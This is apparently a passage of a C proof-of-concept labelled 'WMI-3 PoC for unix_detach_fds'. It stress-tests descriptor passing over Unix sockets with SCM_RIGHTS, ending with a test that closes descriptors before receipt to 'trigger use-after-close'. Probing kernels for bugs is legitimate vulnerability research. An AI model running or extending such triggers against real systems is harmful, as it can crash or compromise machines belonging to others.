static void send_fds(int from, int *fds, int nfds)
{
    struct msghdr msg = {0};
    struct iovec iov;
    char ctrl_buf[CMSG_SPACE(sizeof(int) * nfds)];
    struct cmsghdr *cmsg;
    char data = 'X';
    int ret;

    iov.iov_base = &data;
    iov.iov_len = 1;

    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl_buf;
    msg.msg_controllen = sizeof(ctrl_buf);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * nfds);
    memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * nfds);
    msg.msg_controllen = CMSG_SPACE(sizeof(int) * nfds);

    ret = sendmsg(from, &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        exit(1);
    }
}

static void recv_fds(int from, int flags, int consume)
{
    struct msghdr msg = {0};
    struct iovec iov;
    char ctrl_buf[CMSG_SPACE(sizeof(int) * SCM_MAX_FD)];
    char data = 0;
    int ret;

    iov.iov_base = &data;
    iov.iov_len = 1;

    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl_buf;
    msg.msg_controllen = sizeof(ctrl_buf);
    msg.msg_flags = flags;

    ret = recvmsg(from, &msg, flags);
    if (ret < 0) {
        perror("recvmsg");
        /* Don't exit on failure, the test may still be useful */
    }
}

/* Thread function: repeatedly recv fds */
void *recv_thread(void *arg)
{
    int flags = *(int *)arg;
    for (int i = 0; i < 10; i++) {
        recv_fds(sv[1], flags, 0);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    int data_fds[2];
    pthread_t thr;
    int flags = 0;
    int ret;

    printf("[*] WMI-3 PoC for unix_detach_fds\n");

    /* Create an AF_UNIX SOCK_STREAM pair */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    /* Create a pipe for SCM_RIGHTS data */
    if (pipe(data_fds) < 0) {
        perror("pipe");
        return 1;
    }

    printf("[*] Socket pair: %d, %d  Pipe: %d, %d\n",
           sv[0], sv[1], data_fds[0], data_fds[1]);

    /* Test 1: Simple send/recv with SCM_RIGHTS */
    printf("\n[*] Test 1: Simple send/recv with SCM_RIGHTS\n");
    send_fds(sv[0], data_fds, 2);
    recv_fds(sv[1], 0, 1);

    /* Test 2: Peek then consume */
    printf("\n[*] Test 2: Peek then consume\n");
    send_fds(sv[0], data_fds, 2);
    recv_fds(sv[1], MSG_PEEK, 0);
    recv_fds(sv[1], 0, 1);

    /* Test 3: Multiple sends then recv all */
    printf("\n[*] Test 3: Multiple sends then recv all\n");
    for (int i = 0; i < 3; i++)
        send_fds(sv[0], data_fds, 2);
    for (int i = 0; i < 3; i++)
        recv_fds(sv[1], 0, 1);

    /* Test 4: Many fds */
    printf("\n[*] Test 4: Many fds\n");
    int many_fds[SCM_MAX_FD];
    for (int i = 0; i < SCM_MAX_FD; i++) {
        many_fds[i] = dup(0);
        if (many_fds[i] < 0) {
            perror("dup");
            break;
        }
    }
    send_fds(sv[0], many_fds, SCM_MAX_FD);
    recv_fds(sv[1], 0, 1);

    /* Test 5: Dgram socket instead of stream */
    printf("\n[*] Test 5: Dgram socket\n");
    int dg_sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, dg_sv) < 0) {
        perror("socketpair DGRAM");
    } else {
        send_fds(dg_sv[0], data_fds, 2);
        recv_fds(dg_sv[1], 0, 1);

        /* Dgram with peek */
        send_fds(dg_sv[0], data_fds, 2);
        recv_fds(dg_sv[1], MSG_PEEK, 0);
        recv_fds(dg_sv[1], 0, 1);
        close(dg_sv[0]);
        close(dg_sv[1]);
    }

    /* Test 6: Concurrent send/recv */
    printf("\n[*] Test 6: Concurrent send/recv\n");
    flags = 0;
    ret = pthread_create(&thr, NULL, recv_thread, &flags);
    if (ret == 0) {
        for (int i = 0; i < 10; i++)
            send_fds(sv[0], data_fds, 2);
        pthread_join(thr, NULL);
    }

    /* Test 7: Send socket fds and then manipulate them */
    printf("\n[*] Test 7: Sending socket fds via SCM_RIGHTS\n");
    int pair2[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, pair2) < 0) {
        perror("socketpair 2");
    } else {
        /* Send the socket pair fds as SCM_RIGHTS */
        send_fds(sv[0], pair2, 2);
        recv_fds(sv[1], 0, 1);
        close(pair2[0]);
        close(pair2[1]);
    }

    /* Test 8: Close the sent fds before recv to trigger use-after-close */
    printf("\n[*] Test 8: Close fds before recv\n");
    {
        int tmp_fds[2];
        if (pipe(tmp_fds) < 0) {
            perror("pipe");
        } else {
            send_fds(sv[0], tmp_fds, 2);
            close(tmp_fds[0]);
            close(tmp_fds[1]);
            recv_fds(sv[1], 0, 1);
        }
    }

    printf("\n[*] All tests completed\n");
    close(sv[0]);
    close(sv[1]);
    return 0;
}
